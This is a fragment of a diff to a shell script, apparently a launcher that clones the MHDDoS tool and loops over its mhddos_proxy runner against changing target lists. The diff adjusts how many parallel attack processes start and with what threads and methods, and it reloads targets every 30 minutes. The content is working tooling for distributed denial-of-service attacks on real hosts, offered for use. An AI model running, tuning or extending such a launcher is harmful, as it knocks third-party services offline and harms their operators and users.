@@ -203,13 +203,13 @@ git clone https://github.com/MHProDev/MHDDoS.git
 while true; do
 echo "threads: "$threads; echo "methods: "$methods
         pkill -f start.py; pkill -f runner.py 
-        python3 ~/multidd/mhddos_proxy/runner.py -c $t1 $methods&
+        python3 ~/multidd/mhddos_proxy/runner.py -c $t1 $threads $methods&
         sleep 10 # to decrease load on cpu during simultaneous start
-        python3 ~/multidd/mhddos_proxy/runner.py -c $t2 $methods&
-        sleep 10 # to decrease load on cpu during simultaneous start
-        python3 ~/multidd/mhddos_proxy/runner.py -c $t3 $threads $methods&
-        sleep 10 # to decrease load on cpu during simultaneous start
-        python3 ~/multidd/mhddos_proxy/runner.py -c $t4 $threads $methods&
+        python3 ~/multidd/mhddos_proxy/runner.py -c $t2 $threads $methods&
+        # sleep 10 # to decrease load on cpu during simultaneous start
+        # python3 ~/multidd/mhddos_proxy/runner.py -c $t3 $threads $methods&
+        # sleep 10 # to decrease load on cpu during simultaneous start
+        # python3 ~/multidd/mhddos_proxy/runner.py -c $t4 $threads $methods&
 sleep 30m
 prepare_targets_and_banner
 done
